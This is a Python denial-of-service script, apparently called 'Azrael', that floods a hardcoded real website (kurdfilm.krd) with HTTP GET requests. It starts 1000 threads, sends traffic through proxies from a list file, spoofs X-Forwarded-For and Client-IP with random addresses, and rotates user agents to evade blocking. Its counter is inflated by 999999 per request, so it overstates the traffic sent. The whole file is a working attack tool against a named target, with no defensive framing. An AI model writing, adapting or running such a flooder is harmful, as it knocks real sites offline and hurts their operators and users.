import requests
import random
import string
import threading 
import time

# ANSI COLORS
RED  = '\033[1;31m' 
GREEN  = '\033[1;32m'
CYAN  = '\033[1;36m'
YELLOW = '\033[1;33m'
CLOSE = '\x1b[0m'





url = "https://kurdfilm.krd/"
host_url = "kurdfilm.krd"
referer_list = ["https://google.com"]
user_agents = [
        "Mozilla/5.0 (Linux x86_64; X11) AppleWebKit/537.10 (KHTML, like Gecko) Chrome/14.0.669.98 Safari/535.7",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) Gecko/20071903 Firefox/14.0",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.10 (KHTML, like Gecko) Chrome/8.0.719.23 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 7.0; Macintosh; .NET CLR 2.3.20485; Intel Mac OS X 11_3_4)",
        "Mozilla/5.0 (Linux i386; X11) Gecko/20062610 Firefox/11.0"
]


flag = 0
safe = 0
counter = 0
code = 0


def build_block(size):
    random_letters = [random.choice(string.ascii_uppercase) for _ in range(size)]
    return ''.join(random_letters)

def set_flag(value):
    global flag
    flag = value


def inc_counter():
    global counter
    counter += 999999
    

def https(url):
    randomip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1, utf-8; q=0.7, *; q=0.7',
        'Accept-Language': 'en-US, en; q=0.5',
        'Referer': random.choice(referer_list) + host_url,
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Client-IP': randomip,
        'X-Forwarded-For': randomip,
        'Host': host_url,
    }

    with open('Files/https.txt', 'r') as f:
        listproxy = f.readlines()

    index = random.randint(0, len(listproxy) - 1)
    proxies = {
        'http': listproxy[index].strip(),
    }

    print(f'[+] [ L7 ] {YELLOW}[ Azrael ]{CLOSE} × {counter:<10} × >>> {RED}[ {host_url} ]{CLOSE}')
    
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()  # Raise an error for HTTP error responses
        code = response.status_code

        if flag == 1:
            set_flag(0)
        if code == 500:
            code = 0

    except requests.exceptions.RequestException as e:
        print(f'[-] {RED}Request error: {e}{CLOSE}')
        set_flag(1)
        code = 500
        time.sleep(60)

    except requests.exceptions.Timeout as e:
        print(f'[-] {RED}Request Timedout{CLOSE}')
        set_flag(1)
        code = 500
        time.sleep(60)

    except requests.exceptions.HTTPError as e:
        print(f'[-] {RED}HTTP error: {e}{CLOSE}')
        set_flag(1)
        code = 500
        time.sleep(60)

    else:
        inc_counter()
        requests.get(url, headers=headers, proxies=proxies, timeout=10)

    return code
    
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = https(url)
                if (code == 500) and (safe == 1):
                    set_flag(2)
        except Exception as e:
            print(f"{CYAN}[-] {e}{CLOSE}")

class MonitorThread(threading.Thread):
	def run(self):
		previous = counter
		while flag==0:
			if previous+150<counter and previous!=counter:
				previous = counter
				print(f'[+] [ L7 ] {YELLOW}[ Azrael ]{CLOSE} × {counter:<10} × >>> {RED}[ {host_url} ]{CLOSE}')
		if flag==2:
		    print(f"[∆] we're Done.")    
for x in range(1000):
        HTTPThread().start()
        MonitorThread().start()      
